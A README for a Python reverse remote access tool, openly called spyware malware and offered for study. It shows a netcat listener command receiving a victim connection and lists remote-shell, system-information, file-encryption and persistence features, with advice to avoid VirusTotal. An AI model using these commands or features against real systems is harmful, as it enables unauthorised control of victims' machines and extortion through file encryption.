<h1 align="center">PyRAT</h1>
<p align="center">Python Remote Access Tool</p>
<p align="center">Reverse Remote Access Tool written in Python for study purpose.</p>
<p align="center"> 
   <img src="https://img.shields.io/badge/language-python-blue.svg">
</p>
<p align="center">Tested on Linux.</p>

---

### Disclaimer
Usage of this malware (PyRAT) for attack targets without prior mutual consent is illegal. 
It is the end user's responsability to obey all applicable local, state, federal and international laws. 
Developer assume no liability and not responsible for any misuse or damage caused by this program.

Do not upload to VirusTotal!

---

## Use netcat to receive connection.
```
$ nc -lvp 4444

Listening on 0.0.0.0 4444
Connection received on localhost 39978
Connection Estabilished!
PyRAT 1.12
Host: kali
Say Hi!

cmd>
```

## Help Menu
```
cmd> help

Help Menu:
----------
help  | Help menu.
exit  | Break connection but keep running.
close | Close connection and stop.

sendbc  | Send broadcast notification.
sysinfo | System Information.
pyinfo  | Python Information.
shell   | Spawn shell.
    
genkey  | Generate key.
encry   | Encrypt file.
          Usage: encry /path/to/the/file key
decry   | Decrypt file.
          Usage: decry /path/to/the/file key
          
cmd>
```
---

## About 
PyRAT comes with the objective of studying some processes and possibilities in a simple spyware malware in python.

The project has a simple persistence function which makes the software keeping running looking for a connection even without a server connected.

